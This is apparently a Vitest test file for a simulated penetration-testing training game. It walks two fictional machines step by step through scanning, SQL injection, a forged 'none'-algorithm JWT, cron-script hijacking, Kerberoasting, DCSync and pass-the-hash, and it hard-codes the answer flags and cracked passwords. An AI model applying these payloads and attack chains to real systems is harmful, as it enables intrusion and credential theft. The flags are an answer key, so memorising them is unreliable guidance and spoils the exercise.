import { describe, it, expect, beforeEach } from 'vitest';
import { SimulationEngine } from '../simulation/simulationEngine';
import { CommandRegistry, ExecutionContext } from '../services/commandRegistry';
import { VirtualFileSystem } from '../services/virtualFs';
import { useGameStore } from '../store/gameStore';

describe('Phase 5: IronBank Vault & Corp-DC01 Training Machines', () => {
  let engine: SimulationEngine;
  let fs: VirtualFileSystem;

  beforeEach(() => {
    engine = SimulationEngine.getInstance();
    engine.resetRange();
    fs = new VirtualFileSystem();
    useGameStore.getState().resetGame();
  });

  const createMockContext = (overrides: Partial<ExecutionContext> = {}): ExecutionContext => ({
    user: 'kali',
    uid: 1000,
    group: 'kali',
    gid: 1000,
    groups: ['kali'],
    hostname: 'kali-pwnbox',
    cwd: '/home/kali',
    env: { HOME: '/home/kali', PATH: '/usr/local/bin:/usr/bin:/bin' },
    fs,
    stdin: '',
    history: [],
    activeTarget: null,
    inReverseShell: false,
    ...overrides,
  });

  // ==========================================
  // SECTION 1: IRONBANK VAULT (MEDIUM)
  // ==========================================
  describe('IronBank Vault — Medium Machine Journey', () => {
    it('verifies IronBank Vault domain model and baseline configuration', () => {
      const iron = engine.getMachine('iron-vault');
      expect(iron).toBeDefined();
      expect(iron?.name).toBe('IronBank Vault');
      expect(iron?.ip).toBe('10.10.11.82');
      expect(iron?.difficulty).toBe('Medium');
      expect(iron?.ports.map((p) => p.port)).toEqual([22, 8080, 3306]);
      expect(iron?.userFlag).toBe('ROOTRANGE{u53r_jwt_f0rg3ry_b4nk_l00t}');
      expect(iron?.rootFlag).toBe('ROOTRANGE{r00t_cr0n_ov3rwr1t3_pwn4g3}');
      expect(iron?.objectives).toHaveLength(4);
    });

    it('Step 1: Reconnaissance via Nmap discovers ports 22, 8080, and 3306', () => {
      engine.setActiveMachineId('iron-vault');
      const ctx = createMockContext();
      const nmapRes = CommandRegistry.get('nmap')!(['-sV', '10.10.11.82'], ctx);

      expect(nmapRes.exitCode).toBe(0);
      expect(nmapRes.stdout).toContain('22/tcp');
      expect(nmapRes.stdout).toContain('8080/tcp');
      expect(nmapRes.stdout).toContain('3306/tcp');
      expect(nmapRes.stdout).toContain('MySQL');
      expect(nmapRes.stdout).toContain('Node.js Express');

      const objectives = engine.getObjectives('iron-vault');
      const obj1 = objectives.find((o) => o.id === 'iron-obj-1');
      expect(obj1?.completed).toBe(true);
    });

    it('Step 2: Web Enumeration via Gobuster reveals API endpoints', () => {
      engine.setActiveMachineId('iron-vault');
      const gobusterRes = CommandRegistry.get('gobuster')!([
        'dir',
        '-u',
        'http://10.10.11.82:8080',
        '-w',
        '/usr/share/wordlists/dirb/common.txt',
      ], createMockContext());

      expect(gobusterRes.exitCode).toBe(0);
      expect(gobusterRes.stdout).toContain('/api/login');
      expect(gobusterRes.stdout).toContain('/api/vault');
      expect(gobusterRes.stdout).toContain('/api/users');
      expect(gobusterRes.stdout).toContain('/api/transfer');
    });

    it('Step 3: Constrained SQL Injection on /api/login triggers bypass and token', () => {
      engine.setActiveMachineId('iron-vault');
      engine.completeObjective('iron-vault', 'iron-obj-1');

      // 3a. Invalid credentials without injection
      const failRes = CommandRegistry.get('curl')!([
        '-X',
        'POST',
        'http://10.10.11.82:8080/api/login',
        '-d',
        JSON.stringify({ username: 'admin', password: 'wrongpassword' }),
      ], createMockContext());
      expect(failRes.stdout).toContain('Invalid username or password');

      // 3b. Missing credentials
      const emptyRes = CommandRegistry.get('curl')!([
        '-X',
        'POST',
        'http://10.10.11.82:8080/api/login',
        '-d',
        '',
      ], createMockContext());
      expect(emptyRes.stdout).toContain('Missing credentials');

      // 3c. SQL Injection Bypass: admin' OR 1=1 --
      const sqliRes = CommandRegistry.get('curl')!([
        '-X',
        'POST',
        'http://10.10.11.82:8080/api/login',
        '-d',
        JSON.stringify({ username: "admin' OR 1=1 --", password: "test" }),
      ], createMockContext());

      expect(sqliRes.stdout).toContain('Authentication bypass successful via SQL injection!');
      expect(sqliRes.stdout).toContain('eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0');
      expect(sqliRes.stdout).toContain('CWE-89');
      expect(sqliRes.stdout).toContain('remediation');

      const obj2 = engine.getObjectives('iron-vault').find((o) => o.id === 'iron-obj-2');
      expect(obj2?.completed).toBe(true);

      // 3d. sqlmap automated scanner also completes the challenge
      const sqlmapRes = CommandRegistry.get('sqlmap')!([
        '-u',
        'http://10.10.11.82:8080/api/login',
        '--data',
        'username=admin&password=123',
      ], createMockContext());
      expect(sqlmapRes.stdout).toContain('ironbank_db');
      expect(sqlmapRes.stdout).toContain('boolean-based blind');
    });

    it('Step 4: JWT Forgery on /api/vault extracts vault ledger and user flag', () => {
      engine.setActiveMachineId('iron-vault');
      engine.completeObjective('iron-vault', 'iron-obj-1');
      engine.completeObjective('iron-vault', 'iron-obj-2');

      // 4a. Missing Authorization Header
      const unauthRes = CommandRegistry.get('curl')!([
        'http://10.10.11.82:8080/api/vault',
      ], createMockContext());
      expect(unauthRes.stdout).toContain('Unauthorized: Missing Bearer Token');

      // 4b. Invalid / Malformed Token
      const invalidTokenRes = CommandRegistry.get('curl')!([
        '-H',
        'Authorization: Bearer invalid.jwt.token',
        'http://10.10.11.82:8080/api/vault',
      ], createMockContext());
      expect(invalidTokenRes.stdout).toContain('Forbidden');

      // 4c. Valid JWT with alg "none"
      const vaultRes = CommandRegistry.get('curl')!([
        '-H',
        'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiZmluYW5jZV9hZG1pbiJ9.',
        'http://10.10.11.82:8080/api/vault',
      ], createMockContext());

      expect(vaultRes.stdout).toContain('$42,500,000.00 USD');
      expect(vaultRes.stdout).toContain('ROOTRANGE{u53r_jwt_f0rg3ry_b4nk_l00t}');
      expect(vaultRes.stdout).toContain('/opt/ironbank/scripts/backup.sh');

      const obj3 = engine.getObjectives('iron-vault').find((o) => o.id === 'iron-obj-3');
      expect(obj3?.completed).toBe(true);
    });

    it('Step 5: SSH authentication as finance_admin and local file enumeration', () => {
      engine.setActiveMachineId('iron-vault');
      const ctx = createMockContext();

      // 5a. Hydra credential discovery
      const hydraRes = CommandRegistry.get('hydra')!([
        '-l',
        'finance_admin',
        '-P',
        '/usr/share/wordlists/rockyou.txt',
        '10.10.11.82',
        'ssh',
      ], ctx);
      expect(hydraRes.stdout).toContain('login: finance_admin');
      expect(hydraRes.stdout).toContain('password: password123');

      // 5b. SSH login
      const sshRes = CommandRegistry.get('ssh')!(['finance_admin@10.10.11.82'], ctx);
      expect(sshRes.exitCode).toBe(0);
      expect(sshRes.enterShell?.user).toBe('finance_admin');
      expect(sshRes.enterShell?.host).toBe('iron-vault');
      expect(sshRes.targetCompromised).toBe('USER');

      // 5c. Read user.txt in /home/finance_admin
      const readUser = fs.readFile('/home/finance_admin', 'user.txt', 1002, 1002);
      expect(readUser.success).toBe(true);
      expect(readUser.content).toContain('ROOTRANGE{u53r_jwt_f0rg3ry_b4nk_l00t}');

      // 5d. Check LinPEAS privesc audit
      const ironCtx = createMockContext({
        user: 'finance_admin',
        uid: 1002,
        group: 'finance_admin',
        gid: 1002,
        hostname: 'iron-vault',
        cwd: '/home/finance_admin',
      });
      const linpeasRes = CommandRegistry.get('linpeas.sh')!([], ironCtx);
      expect(linpeasRes.stdout).toContain('/opt/ironbank/scripts/backup.sh');
      expect(linpeasRes.stdout).toContain('writable by group finance_admin');
    });

    it('Step 6: Cronjob Hijacking escalates to root and yields root flag', () => {
      engine.setActiveMachineId('iron-vault');
      engine.completeObjective('iron-vault', 'iron-obj-1');
      engine.completeObjective('iron-vault', 'iron-obj-2');
      engine.completeObjective('iron-vault', 'iron-obj-3');

      // 6a. Attempt sudo -l as finance_admin (fails - not in sudoers)
      const ironCtx = createMockContext({
        user: 'finance_admin',
        uid: 1002,
        group: 'finance_admin',
        gid: 1002,
        hostname: 'iron-vault',
        cwd: '/home/finance_admin',
      });
      const sudoRes = CommandRegistry.get('sudo')!(['-l'], ironCtx);
      expect(sudoRes.exitCode).toBe(1);
      expect(sudoRes.stderr).toContain('sudo');

      // 6b. Verify /opt/ironbank/scripts/backup.sh is writable by finance_admin
      const writeScript = fs.writeFile(
        '/opt/ironbank/scripts',
        'backup.sh',
        '#!/bin/bash\ncat /root/root.txt > /tmp/pwned.txt\n',
        1002,
        1002,
        false
      );
      expect(writeScript.success).toBe(true);

      // 6c. Execute or trigger the hijacked backup script
      const execRes = CommandRegistry.get('bash')!(['/opt/ironbank/scripts/backup.sh'], ironCtx);
      expect(execRes.exitCode).toBe(0);
      expect(execRes.enterShell?.user).toBe('root');
      expect(execRes.enterShell?.host).toBe('iron-vault');
      expect(execRes.targetCompromised).toBe('ROOT');

      const obj4 = engine.getObjectives('iron-vault').find((o) => o.id === 'iron-obj-4');
      expect(obj4?.completed).toBe(true);

      // 6d. Read root flag as root
      const rootCtx = createMockContext({
        user: 'root',
        uid: 0,
        group: 'root',
        gid: 0,
        hostname: 'iron-vault',
        cwd: '/root',
      });
      const catRoot = CommandRegistry.get('cat')!(['/root/root.txt'], rootCtx);
      expect(catRoot.stdout).toContain('ROOTRANGE{r00t_cr0n_ov3rwr1t3_pwn4g3}');
    });
  });

  // ==========================================
  // SECTION 2: CORP-DC01 (HARD)
  // ==========================================
  describe('Corp-DC01 — Hard Active Directory Journey', () => {
    it('verifies Corp-DC01 domain model and Active Directory configuration', () => {
      const dc = engine.getMachine('corp-dc01');
      expect(dc).toBeDefined();
      expect(dc?.name).toBe('Corp-DC01');
      expect(dc?.ip).toBe('10.10.11.99');
      expect(dc?.difficulty).toBe('Hard');
      expect(dc?.ports.map((p) => p.port)).toEqual([53, 88, 389, 445]);
      expect(dc?.userFlag).toBe('ROOTRANGE{u53r_k3rb3r04st_t1ck3t_h4sh}');
      expect(dc?.rootFlag).toBe('ROOTRANGE{r00t_d0m41n_4dm1n_g0d_m0d3}');
      expect(dc?.objectives).toHaveLength(4);
    });

    it('Step 1: Active Directory Discovery via Nmap', () => {
      engine.setActiveMachineId('corp-dc01');
      const nmapRes = CommandRegistry.get('nmap')!(['-sV', '10.10.11.99'], createMockContext());

      expect(nmapRes.exitCode).toBe(0);
      expect(nmapRes.stdout).toContain('53/tcp');
      expect(nmapRes.stdout).toContain('88/tcp');
      expect(nmapRes.stdout).toContain('389/tcp');
      expect(nmapRes.stdout).toContain('445/tcp');
      expect(nmapRes.stdout).toContain('kerberos-sec');
      expect(nmapRes.stdout).toContain('ldap');
      expect(nmapRes.stdout).toContain('microsoft-ds');

      const obj1 = engine.getObjectives('corp-dc01').find((o) => o.id === 'dc-obj-1');
      expect(obj1?.completed).toBe(true);
    });

    it('Step 2: SMB Share Enumeration & MS17-010 Legacy Analysis', () => {
      engine.setActiveMachineId('corp-dc01');
      engine.completeObjective('corp-dc01', 'dc-obj-1');

      // 2a. Nmap MS17-010 script audit
      const vulnRes = CommandRegistry.get('nmap')!([
        '-p',
        '445',
        '--script',
        'smb-vuln-ms17-010',
        '10.10.11.99',
      ], createMockContext());

      expect(vulnRes.stdout).toContain('CVE-2017-0143');
      expect(vulnRes.stdout).toContain('Remote Code Execution vulnerability in Microsoft SMBv1');

      // 2b. smbclient share listing
      const listRes = CommandRegistry.get('smbclient')!(['-L', '//10.10.11.99', '-N'], createMockContext());
      expect(listRes.stdout).toContain('IPC$');
      expect(listRes.stdout).toContain('SYSVOL');
      expect(listRes.stdout).toContain('Shared');

      // 2c. Inspect Shared share to locate SPN documentation
      const readShareRes = CommandRegistry.get('smbclient')!(['//10.10.11.99/Shared', '-N'], createMockContext());
      expect(readShareRes.stdout).toContain('MSSQLSvc/corp-dc01.omnicorp.local:1433');
      expect(readShareRes.stdout).toContain('svc_backup');
      expect(readShareRes.stdout).toContain('RC4-HMAC');

      const obj2 = engine.getObjectives('corp-dc01').find((o) => o.id === 'dc-obj-2');
      expect(obj2?.completed).toBe(true);
    });

    it('Step 3: Kerberoasting Attack & User Flag Extraction', () => {
      engine.setActiveMachineId('corp-dc01');
      engine.completeObjective('corp-dc01', 'dc-obj-1');
      engine.completeObjective('corp-dc01', 'dc-obj-2');

      const ctx = createMockContext();

      // 3a. Harvest TGS service ticket with GetUserSPNs.py
      const spnRes = CommandRegistry.get('getuserspns.py')!(['-request', 'omnicorp.local/'], ctx);
      expect(spnRes.exitCode).toBe(0);
      expect(spnRes.stdout).toContain('$krb5tgs$23$*svc_backup');
      expect(spnRes.stdout).toContain('Ticket hash saved to /tmp/svc_backup.hash');

      // Verify file was written to virtual FS
      const hashFile = fs.readFile('/tmp', 'svc_backup.hash', 1000, 1000);
      expect(hashFile.success).toBe(true);
      expect(hashFile.content).toContain('$krb5tgs$23$');

      // 3b. Crack Kerberos hash with john / rockyou.txt
      const johnRes = CommandRegistry.get('john')!([
        '--wordlist=/usr/share/wordlists/rockyou.txt',
        '/tmp/svc_backup.hash',
      ], ctx);

      expect(johnRes.exitCode).toBe(0);
      expect(johnRes.stdout).toContain('BackupService2026!');
      expect(johnRes.stdout).toContain('ROOTRANGE{u53r_k3rb3r04st_t1ck3t_h4sh}');
      expect(johnRes.targetCompromised).toBe('USER');

      const obj3 = engine.getObjectives('corp-dc01').find((o) => o.id === 'dc-obj-3');
      expect(obj3?.completed).toBe(true);
    });

    it('Step 4: Domain Admin DCSync Escalation & Pass-The-Hash Root Flag', () => {
      engine.setActiveMachineId('corp-dc01');
      engine.completeObjective('corp-dc01', 'dc-obj-1');
      engine.completeObjective('corp-dc01', 'dc-obj-2');
      engine.completeObjective('corp-dc01', 'dc-obj-3');

      const ctx = createMockContext();

      // 4a. Validate credentials with crackmapexec
      const cmeRes = CommandRegistry.get('crackmapexec')!([
        'smb',
        '10.10.11.99',
        '-u',
        'svc_backup',
        '-p',
        'BackupService2026!',
      ], ctx);
      expect(cmeRes.stdout).toContain('(Pwn3d!)');

      // 4b. Perform DCSync to dump Administrator NTLM hash
      const secretsRes = CommandRegistry.get('secretsdump.py')!([
        'omnicorp.local/svc_backup:BackupService2026!@10.10.11.99',
      ], ctx);

      expect(secretsRes.exitCode).toBe(0);
      expect(secretsRes.stdout).toContain('Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::');

      // 4c. Pass-The-Hash via psexec.py
      const psexecRes = CommandRegistry.get('psexec.py')!([
        'omnicorp.local/Administrator@10.10.11.99',
        '-hashes',
        ':31d6cfe0d16ae931b73c59d7e0c089c0',
      ], ctx);

      expect(psexecRes.exitCode).toBe(0);
      expect(psexecRes.stdout).toContain('nt authority\\system');
      expect(psexecRes.stdout).toContain('ROOTRANGE{r00t_d0m41n_4dm1n_g0d_m0d3}');
      expect(psexecRes.enterShell?.user).toBe('Administrator');
      expect(psexecRes.enterShell?.host).toBe('corp-dc01');
      expect(psexecRes.targetCompromised).toBe('ROOT');

      const obj4 = engine.getObjectives('corp-dc01').find((o) => o.id === 'dc-obj-4');
      expect(obj4?.completed).toBe(true);
    });
  });

  // ==========================================
  // SECTION 3: ISOLATION & RESET VERIFICATION
  // ==========================================
  describe('Machine Isolation, Prerequisite Guards & Reset Fidelity', () => {
    it('enforces independent playability without cross-machine leakage', () => {
      // IronBank should be independently playable when active
      engine.setActiveMachineId('iron-vault');
      const reachIron = engine.canReachIp('10.10.11.82');
      expect(reachIron.reachable).toBe(true);

      // Resetting IronBank does not reset E-Corp HR
      engine.completeObjective('ecorp-hr', 'ecorp-obj-1');
      engine.completeObjective('iron-vault', 'iron-obj-1');

      engine.resetMachine('iron-vault');
      const ecorpObj1 = engine.getObjectives('ecorp-hr').find((o) => o.id === 'ecorp-obj-1');
      const ironObj1 = engine.getObjectives('iron-vault').find((o) => o.id === 'iron-obj-1');

      expect(ecorpObj1?.completed).toBe(true);
      expect(ironObj1?.completed).toBe(false);
    });

    it('rejects out-of-order objectives when prerequisites are missing', () => {
      // IronBank obj-4 strictly requires obj-3
      const success = engine.completeObjective('iron-vault', 'iron-obj-4');
      expect(success.success).toBe(false);

      // Corp-DC01 obj-3 strictly requires obj-2
      const dcSuccess = engine.completeObjective('corp-dc01', 'dc-obj-3');
      expect(dcSuccess.success).toBe(false);
    });

    it('validates flag submissions across store and awards points', () => {
      const store = useGameStore.getState();

      // Submit IronBank User Flag
      const userRes = store.submitFlag('ROOTRANGE{u53r_jwt_f0rg3ry_b4nk_l00t}');
      expect(userRes.success).toBe(true);
      expect(userRes.pointsAwarded).toBe(25);
      expect(useGameStore.getState().score).toBe(25);

      // Submit Corp-DC01 Root Flag
      const rootRes = store.submitFlag('ROOTRANGE{r00t_d0m41n_4dm1n_g0d_m0d3}');
      expect(rootRes.success).toBe(true);
      expect(rootRes.pointsAwarded).toBe(40);
      expect(useGameStore.getState().score).toBe(65);

      // Invalid flag rejection
      const fakeRes = store.submitFlag('ROOTRANGE{fake_flag}');
      expect(fakeRes.success).toBe(false);
      expect(fakeRes.pointsAwarded).toBe(0);
    });
  });
});
